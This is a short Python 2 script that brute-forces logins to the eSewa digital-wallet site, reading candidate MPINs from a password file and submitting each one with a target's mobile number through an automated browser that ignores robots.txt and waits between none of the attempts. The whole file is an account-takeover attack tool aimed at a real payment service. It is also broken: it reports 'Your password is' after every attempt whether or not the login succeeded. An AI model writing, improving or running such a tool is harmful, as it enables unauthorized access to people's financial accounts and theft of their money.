import time
import sys

if sys.version_info[0] != 2:
    print('''--------------------------------------
    REQUIRED PYTHON 2.x
    use: python fb2.py
--------------------------------------
        ''')
    sys.exit()

post_url = 'https://www.esewa.com.np/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except ImportError:
    print('\nPlease install mechanize.\n')
    sys.exit()

print('\n---------- Welcome Vicky ----------\n')
file = open('passwords.txt', 'r')

MobileNumber = str(raw_input('Mobile Number : ').strip())

print("\nTarget Mobile Number : ", MobileNumber)
print("\nTrying Passwords from list ...")

i = 0
while True:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 4:
        continue
    print(str(i) + " : " + passw)
    response = browser.open(post_url)
    try:
        if response.code == 200:
            browser.select_form(nr=0)
            browser.form['Mobile Number'] = MobileNumber
            browser.form['MPIN'] = passw  # Adjust the field name as per the form
            response = browser.submit()
            response_data = response.read()
            print(response_data.decode('utf-8'))
            print('Your password is : ', passw)

    except Exception as e:
        print('\nSleeping for time : 0 min\n')
        time.sleep(0)

    if not passw:
        break

file.close()